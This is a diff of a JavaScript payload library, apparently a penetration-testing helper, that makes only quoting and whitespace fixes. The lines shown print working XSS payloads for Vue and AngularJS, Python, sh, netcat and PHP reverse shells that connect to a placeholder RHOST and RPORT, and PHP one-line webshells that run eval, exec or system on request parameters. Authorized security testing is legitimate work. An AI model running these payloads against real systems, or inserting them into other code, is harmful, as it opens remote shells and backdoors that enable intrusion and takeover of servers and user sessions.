@@ -179,13 +179,13 @@ window.Payload.XSS = {
     vue2Interpolation: value => '{{_c.constructor`alert()`()}}',
     vue2Directive: value => '<x/v-=_c.constructor`alert()`()>',
     vue3Interpolation: value => '{{$emit.constructor`alert()`()}}',
-    vue3DynamicComponent: value => '<component is=script text=alert()>'  
+    vue3DynamicComponent: value => '<component is=script text=alert()>'
   },
 
   AngularJS: {
     angularJS1_6WithPrototype$on: value => '<div ng-app ng-csp>{{$on.curry.call().alert()}}</div>',
     // Author: Gareth Heyes (PortSwigger)
-    angularJSWith$event: value => `<div ng-app ng-csp><input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1], alert)'"></div>`
+    angularJSWith$event: value => '<div ng-app ng-csp><input autofocus ng-focus="$event.path|orderBy:\'[].constructor.from([1], alert)\'"></div>'
   },
 
   snippets: {
@@ -223,11 +223,11 @@ window.Payload.SSTI = {
   }
 }
 
-// TODO: show prompt for RHOST and RPORT 
+// TODO: show prompt for RHOST and RPORT
 window.Payload.Shell = {
   Python: {
-    py3: value => `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
-    py: value => `python -c 'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
+    py3: value => 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\'',
+    py: value => 'python -c \'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\''
   },
   sh: {
     withI: value => 'sh -i >& /dev/tcp/RHOST/RPORT 0>&1',
@@ -238,7 +238,7 @@ window.Payload.Shell = {
     withC: value => 'nc -c bash RHOST RPORT'
   },
   php: {
-    reverseShell: value => `php -r '$sock=fsockopen("RHOST",RPORT);exec("sh <&3 >&3 2>&3");'`,
+    reverseShell: value => 'php -r \'$sock=fsockopen("RHOST",RPORT);exec("sh <&3 >&3 2>&3");\'',
     webshellEval: value => '<?=eval($_GET[_]);',
     webshellExec: value => '<?=exec($_GET[_]);',
     webshellSystem: value => '<?=system($_GET[_]);',
